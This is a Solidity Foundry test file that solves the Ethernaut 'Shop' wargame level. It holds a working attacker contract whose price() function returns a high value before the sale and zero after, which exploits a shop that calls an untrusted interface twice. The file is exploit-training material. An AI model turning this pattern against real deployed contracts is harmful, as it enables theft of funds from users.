// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Shop} from "../src/levels/Shop.sol";

/// Ethernaut #21 "Shop" → SC02 logic / untrusted-interface assumption (no exact catalog entry; the
/// Elevator sibling). `buy()` calls `price()` twice and trusts it to be constant; the attacker's
/// `price()` returns >= 100 before the sale and 0 after. Win: shop price < 100.
contract ShopAttacker {
    Shop shop;

    function attack(Shop s) external {
        shop = s;
        s.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100; // high before sale, low after
    }
}

contract ShopTest is Test {
    function test_solve_shop() public {
        Shop lvl = new Shop();
        ShopAttacker a = new ShopAttacker();
        a.attack(lvl);
        assertLt(lvl.price(), 100, "shop price reduced below 100");
    }
}
